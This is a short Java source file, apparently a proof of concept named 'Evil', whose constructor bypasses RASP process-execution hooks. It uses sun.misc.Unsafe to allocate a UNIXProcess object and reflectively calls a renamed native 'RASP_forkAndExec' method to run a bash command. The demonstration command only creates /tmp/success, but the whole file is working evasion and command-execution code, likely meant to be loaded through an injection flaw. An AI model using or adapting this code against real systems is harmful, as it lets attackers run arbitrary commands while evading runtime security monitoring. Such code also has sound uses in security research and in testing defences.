package com.drunkbaby;

import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Evil {
    public Evil() throws Exception {
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        Class clazz = Class.forName("java.lang.UNIXProcess");
        Object obj = unsafe.allocateInstance(clazz);

        String[] cmd = new String[] {"bash", "-c", "touch /tmp/success"};

        byte[][] cmdArgs = new byte[cmd.length - 1][];
        int size = cmdArgs.length;

        for (int i = 0; i < cmdArgs.length; i++) {
            cmdArgs[i] = cmd[i + 1].getBytes();
            size += cmdArgs[i].length;
        }

        byte[] argBlock = new byte[size];
        int i = 0;

        for (byte[] arg : cmdArgs) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }

        int[] envc = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};

        Field launchMechanismField = clazz.getDeclaredField("launchMechanism");
        Field helperpathField = clazz.getDeclaredField("helperpath");

        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);

        Object launchMechanism = launchMechanismField.get(obj);
        byte[] helperpath = (byte[]) helperpathField.get(obj);

        int ordinal = (int) launchMechanism.getClass().getMethod("ordinal").invoke(launchMechanism);

        Method forkMethod = clazz.getDeclaredMethod("RASP_forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class);
        forkMethod.setAccessible(true);
        forkMethod.invoke(obj, ordinal + 1, helperpath, toCString(cmd[0]), argBlock, cmdArgs.length, null, envc[0], null, std_fds, false);
    }

    public byte[] toCString(String s) {
        if (s == null) {
            return null;
        }
        byte[] bytes = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
}